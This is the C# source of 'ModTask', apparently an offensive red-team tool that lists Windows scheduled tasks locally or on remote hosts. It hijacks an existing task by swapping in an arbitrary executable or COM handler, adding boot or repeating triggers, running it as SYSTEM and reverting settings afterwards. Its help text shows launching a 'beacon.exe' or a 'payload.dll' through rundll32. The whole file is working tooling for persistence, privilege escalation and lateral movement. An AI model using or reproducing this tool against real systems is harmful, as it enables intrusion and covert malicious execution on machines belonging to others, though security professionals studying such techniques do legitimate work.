using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Runtime.InteropServices;
using TaskScheduler;

namespace ModTask
{
    internal class Program
    {
        static List<IRegisteredTask> ListTasks(List<IRegisteredTask> list, ITaskFolder folder)
        {
            foreach (IRegisteredTask task in folder.GetTasks(1))
            {
                list.Add(task);
            }

            foreach (ITaskFolder subFolder in folder.GetFolders(1))
            {
                ListTasks(list, subFolder);
            }

            Marshal.ReleaseComObject(folder);
            return list;
        }

        static IRegisteredTask GetModTask(List<IRegisteredTask> taskList, string modTaskName)
        {
            bool status = false;
            IRegisteredTask foundTask = null;

            try
            {
                foreach (IRegisteredTask task in taskList)
                {
                    if (String.Compare(task.Name, modTaskName) == 0)
                    {
                        Console.WriteLine("[+] Found Requested Task: {0}", task.Name);
                        status = true;
                        foundTask = task;
                    }
                }

                if (!status)
                {
                    Console.WriteLine("[+] Requested Task Was Not Found For Modification");
                    Environment.Exit(0);
                }

                return foundTask;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                return null;
            }
        }

        static ITaskService InitTaskScheduler(string serverName, string username, string domain, string password)
        {
            try
            {
                ITaskService ts = new TaskScheduler.TaskScheduler();

                if ((!String.IsNullOrEmpty(username) || !String.IsNullOrEmpty(password) || !String.IsNullOrEmpty(domain))
                    && String.IsNullOrEmpty(serverName))
                {
                    Console.WriteLine("[+] Username, Password and Domain are only for remote use. Rerun without those flags for local execution.");
                    Environment.Exit(0);
                }

                if (!String.IsNullOrEmpty(username) && !String.IsNullOrEmpty(password)
                    && !String.IsNullOrEmpty(domain) && !String.IsNullOrEmpty(serverName))
                {
                    ts.Connect(serverName, username, domain, password);
                }
                else if (!String.IsNullOrEmpty(username) && !String.IsNullOrEmpty(password)
                         && !String.IsNullOrEmpty(serverName))
                {
                    ts.Connect(serverName, username, "", password);
                }
                else if (String.IsNullOrEmpty(username) && String.IsNullOrEmpty(password)
                         && String.IsNullOrEmpty(domain) && !String.IsNullOrEmpty(serverName))
                {
                    ts.Connect(serverName);
                }
                else
                {
                    ts.Connect();
                }

                return ts;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
                return null;
            }
        }

        static void ListTaskStart(string serverName, string username, string domain, string password, bool acl)
        {
            try
            {
                ITaskService ts = InitTaskScheduler(serverName, username, domain, password);
                ITaskFolder rootFolder = ts.GetFolder(@"\");

                if (rootFolder == null)
                {
                    Environment.Exit(0);
                }

                List<IRegisteredTask> tasks = new List<IRegisteredTask>();
                ListTasks(tasks, rootFolder);

                foreach (IRegisteredTask task in tasks)
                {
                    Console.WriteLine("Task Name: " + task.Name);

                    if (!String.IsNullOrEmpty(task.Definition.Principal.UserId))
                    {
                        Console.WriteLine("Run As Principal: {0}", task.Definition.Principal.UserId);
                    }
                    Console.WriteLine("State: {0}", task.Definition.Settings.Enabled);

                    if (!String.IsNullOrEmpty(task.Definition.Principal.GroupId))
                    {
                        Console.WriteLine("Run As Principal: {0}", task.Definition.Principal.GroupId);
                    }

                    Console.WriteLine("Last RunTime: {0}", task.LastRunTime);

                    if ((int)task.State == 4)
                    {
                        Console.WriteLine("Status: Running");
                    }

                    if (acl)
                    {
                        string result = task.GetSecurityDescriptor(1 | 2 | 4);
                        Console.WriteLine("SDDL: " + result + "\n");
                    }

                    Console.WriteLine("----------------------------");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static void ModTaskStart(
            string serverName, string username, string domain, string password,
            string taskToMod, string argExe, string exeArgs,
            bool sys, bool com, string classID,
            bool boottrigger, bool timetrigger, string repDur, string repInter,
            string backupPath)
        {
            try
            {
                IRunningTask runTask = null;
                bool demandChanged = false;
                bool enableStateChanged = false;

                ITaskService ts = InitTaskScheduler(serverName, username, domain, password);
                ITaskFolder rootFolder = ts.GetFolder(@"\");

                List<IRegisteredTask> tasks = new List<IRegisteredTask>();
                ListTasks(tasks, rootFolder);

                IRegisteredTask returnedTask = GetModTask(tasks, taskToMod);
                Console.WriteLine("[+] Task Path: {0}", returnedTask.Path);

                if (timetrigger || boottrigger)
                {
                    string safeTaskName = string.Concat(returnedTask.Name.Split(Path.GetInvalidFileNameChars()));
                    string autoFileName = safeTaskName + "_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".xml";

                    string resolvedPath;
                    if (string.IsNullOrEmpty(backupPath))
                        resolvedPath = autoFileName;
                    else if (Directory.Exists(backupPath))
                        resolvedPath = Path.Combine(backupPath, autoFileName);
                    else
                        resolvedPath = backupPath;

                    string parentDir = Path.GetDirectoryName(Path.GetFullPath(resolvedPath));
                    if (!string.IsNullOrEmpty(parentDir) && !Directory.Exists(parentDir))
                        Directory.CreateDirectory(parentDir);

                    File.WriteAllText(resolvedPath, returnedTask.Xml);
                    Console.WriteLine("[+] Saved original task XML to: " + Path.GetFullPath(resolvedPath));
                }

                ITaskDefinition taskdef = returnedTask.Definition;
                IActionCollection taskActionCol = taskdef.Actions;
                taskActionCol.Clear();

                if(taskdef.Settings.Enabled == false)
                {
                    taskdef.Settings.Enabled = true;
                    Console.WriteLine("[+] Enabled Disabled Task ");
                    enableStateChanged = true;
                }
                

                if (com)
                {
                    IAction comTaskAction = taskActionCol.Create(_TASK_ACTION_TYPE.TASK_ACTION_COM_HANDLER);
                    IComHandlerAction comAction = (IComHandlerAction)comTaskAction;
                    comAction.ClassId = classID;
                }
                else
                {
                    IAction taskAction = taskActionCol.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
                    IExecAction execAction = (IExecAction)taskAction;
                    execAction.Path = argExe;
                    execAction.Arguments = exeArgs;
                }

                ITriggerCollection trigCollection = taskdef.Triggers;
                trigCollection.Clear();

                if (timetrigger)
                {
                    ITrigger trig = trigCollection.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_TIME);
                    ITimeTrigger dailyTrig = (ITimeTrigger)trig;
                    dailyTrig.StartBoundary = DateTime.UtcNow.AddMinutes(1.0).ToString("o");
                    dailyTrig.Repetition.Interval = repInter;
                    dailyTrig.Repetition.Duration = repDur;
                }



                if (boottrigger)
                {
                    ITrigger trig2 = trigCollection.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_BOOT);
                    IBootTrigger boot = (IBootTrigger)trig2;
                    boot.Enabled = true;
                }
                
                if(timetrigger || boottrigger)
                {
                    taskdef.Settings.MultipleInstances = _TASK_INSTANCES_POLICY.TASK_INSTANCES_PARALLEL;
                }

                string path = returnedTask.Path.Substring(0, returnedTask.Path.LastIndexOf("\\"));
                ITaskSettings tasksettings = taskdef.Settings;

                if ((int)returnedTask.State == 4)
                {
                    Console.WriteLine("[+] Task Is Currently Running, Stopping Before Modification");
                    returnedTask.Stop(0);
                    Console.WriteLine("[+] Stopped Task Successfully");
                }

                if (tasksettings.AllowDemandStart != true)
                {
                    tasksettings.AllowDemandStart = true;
                    Console.WriteLine("[+] Enabled AllowDemandStart setting");
                    demandChanged = true;
                }

                ITaskFolder returnedFolder = ts.GetFolder(path);

                returnedFolder.RegisterTaskDefinition(
                    returnedTask.Name, taskdef, 4, null, null,
                    _TASK_LOGON_TYPE.TASK_LOGON_NONE, null);

                if (sys)
                {
                    runTask = returnedTask.RunEx(null, 0, 0, "NT AUTHORITY\\SYSTEM");
                    Console.WriteLine("[+] Successfully Ran Task: {0}", returnedTask.Name);
                }
                else
                {
                    runTask = returnedTask.Run(null);
                    Console.WriteLine("[+] Successfully Ran Task: {0}", returnedTask.Name);
                }

                if (!timetrigger && !boottrigger)
                {
                    if (demandChanged)
                    {
                        tasksettings.AllowDemandStart = false;
                    }
                    if (enableStateChanged)
                    {
                        tasksettings.Enabled = false;
                    }

                    returnedFolder.RegisterTaskDefinition(
                        returnedTask.Name, returnedTask.Definition, 4, null, null,
                        _TASK_LOGON_TYPE.TASK_LOGON_NONE, null);
                    Console.WriteLine("[+] Successfully Reverted Task: {0}", returnedTask.Name);
                }

                foreach (IRegisteredTask task in tasks)
                {
                    Marshal.ReleaseComObject(task);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static void SelectTask(string serverName, string username, string domain, string password, string selectTask)
        {
            try
            {
                ITaskService ts = InitTaskScheduler(serverName, username, domain, password);
                if (ts == null)
                {
                    Console.WriteLine("[!] Failed to connect to Task Scheduler.");
                    return;
                }

                ITaskFolder rootFolder = ts.GetFolder(@"\");

                List<IRegisteredTask> tasks = new List<IRegisteredTask>();
                ListTasks(tasks, rootFolder);

                IRegisteredTask returnedTask = GetModTask(tasks, selectTask);
                if (returnedTask == null)
                {
                    Console.WriteLine("[!] Failed to retrieve task definition.");
                    return;
                }

                Console.WriteLine(returnedTask.Xml);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static void RevertTask(string serverName, string username, string domain, string password, string taskName, string xmlFile)
        {
            try
            {
                if (!File.Exists(xmlFile))
                {
                    Console.WriteLine("[!] XML backup file not found: " + xmlFile);
                    return;
                }

                string xml = File.ReadAllText(xmlFile);

                ITaskService ts = InitTaskScheduler(serverName, username, domain, password);
                if (ts == null)
                {
                    Console.WriteLine("[!] Failed to connect to Task Scheduler.");
                    return;
                }

                ITaskFolder rootFolder = ts.GetFolder(@"\");
                if (rootFolder == null)
                {
                    Console.WriteLine("[!] Failed to get root task folder.");
                    return;
                }

                List<IRegisteredTask> tasks = new List<IRegisteredTask>();
                ListTasks(tasks, rootFolder);

                IRegisteredTask returnedTask = GetModTask(tasks, taskName);
                if (returnedTask == null)
                {
                    Console.WriteLine("[!] Failed to locate task: " + taskName);
                    return;
                }

                string path = returnedTask.Path.Substring(0, returnedTask.Path.LastIndexOf("\\"));
                if (string.IsNullOrEmpty(path))
                    path = @"\";

                ITaskFolder taskFolder = ts.GetFolder(path);
                if (taskFolder == null)
                {
                    Console.WriteLine("[!] Failed to get task folder: " + path);
                    return;
                }

                taskFolder.RegisterTask(taskName, xml, 4, null, null, _TASK_LOGON_TYPE.TASK_LOGON_NONE, null);
                Console.WriteLine("[+] Successfully reverted task '{0}' from: {1}", taskName, xmlFile);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static void Logo()
        {
            string logo = @"
         .---.  ,'|""\   _______  .--.     .---. ,-. .-. 
|\    /|/ .-. ) | |\ \ |__   __|/ /\ \   ( .-._)| |/ /  
|(\  / || | |(_)| | \ \  )| |  / /__\ \ (_) \   | | /   
(_)\/  || | | | | |  \ \(_) |  |  __  | _  \ \  | | \   
| \  / |\ `-' / /(|`-' /  | |  | |  |)|( `-'  ) | |) \  
| |\/| | )---' (__)`--'   `-'  |_|  (_) `----'  |((_)-' 
'-'  '-'(_)                                     (_)     
@JSECUSECURITY

";
            Console.WriteLine(logo);
        }

        static void ShowHelp()
        {
            Console.WriteLine(@"
Usage: ModTask.exe --mode <list|modify|select|revert> [OPTIONS]

Modes:
  list     List all scheduled tasks on the target system.
  modify   Modify a scheduled task's action/trigger for execution.
  select   Print the full XML definition of a specific task.
  revert   Restore a task to a previously saved XML backup.

General Options:
  --mode, -m          (Required) Operation mode: list, modify, or select.
  --servername, -s    Remote server to connect to.  Omit for local.
  --username, -u      Username for remote auth.  Omit to use current token.
  --password, -p      Password for remote auth.
  --domain, -d        Domain for remote auth.
  --help, -h          Show this help message.

List Mode Options:
  --sddl, -c          Also display SDDL strings for each task.

Select Mode Options:
  --taskName, -t      Name of the task to inspect.

Revert Mode Options:
  --taskName, -t      (Required) Name of the task to revert.
  --xmlFile, -f       (Required) Path to the XML backup file.

Modify Mode Options:
  --taskName, -t      (Required) Name of the task to modify.
  --exePath, -e       Executable path for the new action.
  --exeArgs, -a       Arguments for the executable.
  --sys, -l           Run the task as NT AUTHORITY\SYSTEM.
  --com, -o           Use a COM handler action instead of an exe.
  --comClassID, -i    CLSID for the COM handler (use with --com).
  --timetrigger       Add a daily trigger with repetition pattern.
  --repInterval, -r   Repetition interval (e.g., PT5M = 5 minutes).
  --repDuration       Repetition duration  (e.g., PT1H = 1 hour).
  --boottrigger, -b   Add a boot/startup trigger.
  --backupPath        Directory or full file path for the XML backup written
                      before modification (only used with --timetrigger or --boottrigger).
                      Defaults to the current working directory.

Examples:
  ModTask.exe --mode list
  ModTask.exe --mode list --servername DC01 --sddl
  ModTask.exe --mode select --taskName ""ScheduledDefrag""
  ModTask.exe --mode modify --taskName ""ScheduledDefrag"" --exePath ""C:\temp\beacon.exe""
  ModTask.exe --mode modify --taskName ""ScheduledDefrag"" --com --comClassID ""{CLSID}"" --boottrigger
  ModTask.exe --mode modify --taskName ""Cleanup"" --exePath ""rundll32.exe"" --exeArgs ""payload.dll,Start"" --timetrigger --repInterval PT5M --repDuration PT1H
  ModTask.exe --mode revert --taskName ""ScheduledDefrag"" --xmlFile ""ScheduledDefrag_20240101_120000.xml""
");
        }

        static string StripQuotes(string s)
        {
            if (string.IsNullOrEmpty(s) || s.Length < 2)
                return s ?? "";
            if ((s[0] == '"' && s[s.Length - 1] == '"') || (s[0] == '\'' && s[s.Length - 1] == '\''))
                return s.Substring(1, s.Length - 2);
            return s;
        }

        static Dictionary<string, string> ParseArgs(string[] args)
        {
            var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

            try
            {
                for (int i = 0; i < args.Length; i++)
                {
                    string arg = StripQuotes(args[i]);

                    if (string.IsNullOrEmpty(arg))
                        continue;

                    if (arg.StartsWith("--"))
                    {
                        string key = arg.Substring(2);
                        if (string.IsNullOrEmpty(key))
                            continue;

                        if (i + 1 < args.Length)
                        {
                            string next = StripQuotes(args[i + 1]);
                            if (!(next.StartsWith("--") || (next.StartsWith("-") && next.Length == 2)))
                            {
                                dict[key] = next;
                                i++;
                            }
                            else
                            {
                                dict[key] = "true";
                            }
                        }
                        else
                        {
                            dict[key] = "true";
                        }
                    }
                    else if (arg.StartsWith("-"))
                    {
                        string key = arg.Substring(1);
                        if (string.IsNullOrEmpty(key))
                            continue;

                        if (i + 1 < args.Length)
                        {
                            string next = StripQuotes(args[i + 1]);
                            if (!(next.StartsWith("--") || (next.StartsWith("-") && next.Length == 2)))
                            {
                                dict[key] = next;
                                i++;
                            }
                            else
                            {
                                dict[key] = "true";
                            }
                        }
                        else
                        {
                            dict[key] = "true";
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[!] Argument parsing error: " + e.Message);
            }

            return dict;
        }

        static string GetOpt(Dictionary<string, string> opts, params string[] keys)
        {
            foreach (string key in keys)
            {
                if (opts.ContainsKey(key))
                    return opts[key];
            }
            return "";
        }

        static bool HasFlag(Dictionary<string, string> opts, params string[] keys)
        {
            foreach (string key in keys)
            {
                if (opts.ContainsKey(key))
                    return true;
            }
            return false;
        }

        static void Main(string[] args)
        {
            Logo();

            if (args.Length == 0 || HasFlag(ParseArgs(args), "help", "h"))
            {
                ShowHelp();
                return;
            }

            var opts = ParseArgs(args);

            string mode = GetOpt(opts, "mode", "m").ToLower();

            if (String.IsNullOrEmpty(mode))
            {
                Console.WriteLine("[!] --mode is required.");
                return;
            }

            string serverName = GetOpt(opts, "servername", "s");
            string username = GetOpt(opts, "username", "u");
            string password = GetOpt(opts, "password", "p");
            string domain = GetOpt(opts, "domain", "d");

            if (mode == "list")
            {
                string taskName = GetOpt(opts, "taskName", "t");
                if (!String.IsNullOrEmpty(taskName))
                {
                    Console.WriteLine("[!] --taskName is not valid for list mode.");
                    return;
                }

                bool sddl = HasFlag(opts, "sddl", "c");
                ListTaskStart(serverName, username, domain, password, sddl);
            }
            else if (mode == "modify")
            {
                string taskToMod = GetOpt(opts, "taskName", "t");
                if (String.IsNullOrEmpty(taskToMod))
                {
                    Console.WriteLine("[!] --taskName is required for modify mode.");
                    return;
                }

                bool com = HasFlag(opts, "com", "o");
                string argExe = GetOpt(opts, "exePath", "e");
                string exeArgs = GetOpt(opts, "exeArgs", "a");
                string classID = GetOpt(opts, "comClassID", "i");

                if (com)
                {
                    if (String.IsNullOrEmpty(classID))
                    {
                        Console.WriteLine("[!] --comClassID is required when using --com.");
                        return;
                    }
                    if (!String.IsNullOrEmpty(argExe))
                    {
                        Console.WriteLine("[!] --exePath cannot be used with --com.");
                        return;
                    }
                    if (!String.IsNullOrEmpty(exeArgs))
                    {
                        Console.WriteLine("[!] --exeArgs cannot be used with --com.");
                        return;
                    }
                }
                else
                {
                    if (String.IsNullOrEmpty(argExe))
                    {
                        Console.WriteLine("[!] --exePath is required for modify mode.");
                        return;
                    }
                }

                bool timetrigger = HasFlag(opts, "timetrigger");
                bool boottrigger = HasFlag(opts, "boottrigger", "b");
                string repInter = GetOpt(opts, "repInterval", "r");
                string repDur = GetOpt(opts, "repDuration");

                if (timetrigger && String.IsNullOrEmpty(repInter))
                {
                    Console.WriteLine("[!] --repInterval is required when using --timetrigger.");
                    return;
                }

                bool sys = HasFlag(opts, "sys", "l");
                string backupPath = GetOpt(opts, "backupPath");

                ModTaskStart(serverName, username, domain, password,
                             taskToMod, argExe, exeArgs,
                             sys, com, classID,
                             boottrigger, timetrigger, repDur, repInter,
                             backupPath);
            }
            else if (mode == "select")
            {
                string taskToSelect = GetOpt(opts, "taskName", "t");
                if (String.IsNullOrEmpty(taskToSelect))
                {
                    Console.WriteLine("[!] --taskName is required for select mode.");
                    return;
                }

                SelectTask(serverName, username, domain, password, taskToSelect);
            }
            else if (mode == "revert")
            {
                string taskToRevert = GetOpt(opts, "taskName", "t");
                if (String.IsNullOrEmpty(taskToRevert))
                {
                    Console.WriteLine("[!] --taskName is required for revert mode.");
                    return;
                }

                string xmlFile = GetOpt(opts, "xmlFile", "f");
                if (String.IsNullOrEmpty(xmlFile))
                {
                    Console.WriteLine("[!] --xmlFile is required for revert mode.");
                    return;
                }

                RevertTask(serverName, username, domain, password, taskToRevert, xmlFile);
            }
            else
            {
                Console.WriteLine("[!] Unknown mode '{0}'. Valid modes: list, modify, select, revert.", mode);
                return;
            }
        }
    }
}


